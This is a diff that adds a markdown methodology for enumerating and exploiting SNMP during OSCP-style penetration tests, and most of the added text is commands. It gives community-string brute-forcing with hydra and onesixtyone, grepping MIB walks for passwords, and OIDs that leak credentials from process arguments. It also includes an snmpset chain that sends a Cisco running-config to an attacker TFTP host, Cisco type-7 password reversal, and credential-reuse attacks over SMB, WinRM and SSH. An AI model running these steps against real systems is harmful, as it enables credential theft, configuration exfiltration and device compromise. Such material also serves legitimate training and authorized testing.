@@ -173,3 +173,165 @@ a FETCH 1:* BODY[]
 ---
 
 _Document why each command was run — the enumeration finding that justified it — for report writeup._
+
+# SNMP (Port 161/UDP) Enumeration & Exploitation Methodology
+
+Applies once nmap shows `161/udp open snmp` (or `10161`/TCP on some appliances). SNMP is UDP — always confirm with a UDP scan, TCP results alone will miss it.
+
+---
+
+## 1. Confirm & fingerprint
+
+```bash
+nmap -sU -p161 --open -sV <target_ip>
+nmap -sU -p161 --script snmp-info,snmp-sysdescr -oN snmp-nmap.txt <target_ip>
+```
+
+**Decision point:** if the port shows `open|filtered` instead of `open` → UDP response is ambiguous (no ICMP unreachable). Don't discard the port; proceed straight to community string testing below, since a correct community string will get a real reply even when nmap is unsure.
+
+---
+
+## 2. Community string discovery
+
+Try defaults first — this succeeds far more often than it should, especially on network gear and printers.
+
+```bash
+# Quick manual check of the classics
+for c in public private manager admin cisco community; do
+  echo "[*] $c"; snmpget -v1 -c $c <target_ip> 1.3.6.1.2.1.1.1.0
+done
+```
+
+Automated sweep with `onesixtyone` (fast, good for a full subnet too):
+
+```bash
+# default community string list ships with the tool
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <target_ip>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i targets.txt   # for a subnet/list
+```
+
+Brute-force with a bigger wordlist if defaults fail:
+
+```bash
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -u <target_ip> snmp
+```
+
+**Decision point:** community string found → note whether it's **read-only (RO)** or **read-write (RW)**. Test write access immediately (step 6) — RW is the highest-value finding on this whole surface.
+
+```bash
+# Confirm RW: a successful set = write access
+snmpset -v1 -c <community> <target_ip> 1.3.6.1.2.1.1.4.0 s "pwn-test"
+```
+
+---
+
+## 3. Full MIB walk
+
+```bash
+snmpwalk -v1 -c <community> <target_ip> . > snmpwalk-full.txt
+snmpwalk -v2c -c <community> <target_ip> . >> snmpwalk-full.txt   # v2c gives bulk walk, often faster/more complete
+```
+
+One-shot structured summary (installed software, users, processes, network info, routes, TCP listeners) — this is usually your fastest win:
+
+```bash
+snmp-check -c <community> <target_ip>
+```
+
+Grep the raw walk for anything juicy while you read `snmp-check` output:
+
+```bash
+grep -iE "pass|pwd|credential|login|key|secret" snmpwalk-full.txt
+```
+
+---
+
+## 4. Targeted OID pulls (when the full walk is huge / noisy)
+
+|OID|Data|
+|---|---|
+|`1.3.6.1.2.1.1.1.0`|sysDescr — OS/version banner|
+|`1.3.6.1.2.1.25.1.6.0`|hrSystemProcesses — running process count|
+|`1.3.6.1.2.1.25.4.2.1.2`|hrSWRunName — **running processes** (full list)|
+|`1.3.6.1.2.1.25.4.2.1.4`|hrSWRunPath — path of each running process|
+|`1.3.6.1.2.1.25.6.3.1.2`|hrSWInstalledName — **installed software**|
+|`1.3.6.1.4.1.77.1.2.25`|Windows user accounts|
+|`1.3.6.1.2.1.25.4.2.1.5`|hrSWRunParameters — **process command-line args (often leaks creds/paths)**|
+|`1.3.6.1.2.1.6.13.1.3`|tcpConnState — open TCP connections/listening ports|
+|`1.3.6.1.2.1.4.21.1.1`|ipRouteTable — routing table (pivot recon)|
+|`1.3.6.1.4.1.77.1.4.2`|Windows shares|
+|`1.3.6.1.2.1.25.2.3.1.4`|hrStorageUsed — disk usage per volume|
+
+```bash
+snmpwalk -v2c -c <community> <target_ip> 1.3.6.1.2.1.25.4.2.1.2   # running processes
+snmpwalk -v2c -c <community> <target_ip> 1.3.6.1.2.1.25.4.2.1.5   # process args -- check for embedded creds
+snmpwalk -v2c -c <community> <target_ip> 1.3.6.1.2.1.6.13.1.3     # internal listening ports -> pivot candidates
+```
+
+**Decision point:** if `hrSWRunParameters` shows a service launched with `-p <password>` or a mapped drive/script with embedded creds → immediate credential capture, note it for the report and try against other discovered services (SSH/RDP/SMB) — see step 7.
+
+---
+
+## 5. Windows-specific OIDs (SNMP on a domain box)
+
+```bash
+snmpwalk -v1 -c <community> <target_ip> 1.3.6.1.4.1.77.1.2.25   # local user accounts
+snmpwalk -v1 -c <community> <target_ip> 1.3.6.1.4.1.77.1.4.2    # shares
+```
+
+Cross-reference the user list against later Kerberos/SMB enumeration (kerbrute userenum, RID cycling) — SNMP is frequently the _first_ source of a valid username list on a box that otherwise blocks null-session enum.
+
+---
+
+## 6. Exploiting write access (RW community found)
+
+If step 2 confirmed RW, escalate beyond the sanity-check set:
+
+```bash
+# Change sysContact/sysLocation - low-risk proof of write, good for report evidence
+snmpset -v1 -c <rw_community> <target_ip> 1.3.6.1.2.1.1.4.0 s "owned-by-oscp"
+
+# Cisco IOS: RW community + write access to running-config OID can allow config exfil/modification
+# (requires TFTP server reachable from the device)
+snmpset -v1 -c <rw_community> <target_ip> 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 4 \
+  1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 1 \
+  1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 a <your_tftp_ip> \
+  1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 s running-config \
+  1.3.6.1.4.1.9.9.96.1.1.1.1.6.1 s exfil-config.txt \
+  1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1
+```
+
+**Decision point:** Cisco config exfil succeeds → grep the pulled config for `enable secret`, `username ... password`, SNMP RW strings for other devices, and VTY/AUX line passwords — these frequently crack fast with hashcat (type 7 Cisco "encoding" is trivially reversible, type 5 is MD5-crypt).
+
+```bash
+# Cisco type 7 reversal (not real encryption)
+python3 -c "import sys; from cisco_type7 import decrypt; print(decrypt('<type7_string>'))"
+# or use an online/offline type-7 decoder tool
+```
+
+---
+
+## 7. Credential reuse pivot
+
+Any community string, username, or plaintext credential pulled via SNMP gets tried immediately against every other open service:
+
+```bash
+netexec smb <target_ip> -u <user_from_snmp> -p <cred_from_snmp>
+netexec winrm <target_ip> -u <user_from_snmp> -p <cred_from_snmp>
+hydra -l <user_from_snmp> -p <cred_from_snmp> ssh://<target_ip>
+```
+
+---
+
+## Priority-ordered fast path (try these first)
+
+1. **Default/common community strings** (`public`/`private`) via manual `snmpget` — near-zero cost, frequently works, especially on printers, network gear, ESXi hosts.
+2. **`snmp-check`** full dump the moment any community string is confirmed — single command, structured output covering processes/software/users/shares.
+3. **`hrSWRunParameters` (process args)** — the single highest-yield OID for leaked credentials.
+4. **Write-access test** on any confirmed community string — RW SNMP on Cisco gear is a fast path to full device compromise via config exfil.
+5. **Windows user/account OIDs** — cheap source of a valid username list for later Kerberos/SMB attacks.
+6. **Community string brute-force** with `onesixtyone`/`hydra` only if the above all fail — highest time cost, lowest yield.
+
+---
+
+Document which OID/output justified each follow-up action (e.g. "hrSWRunParameters revealed plaintext service password → reused against SMB") — this chain of evidence is what OSCP report grading looks for, not just the final shell.
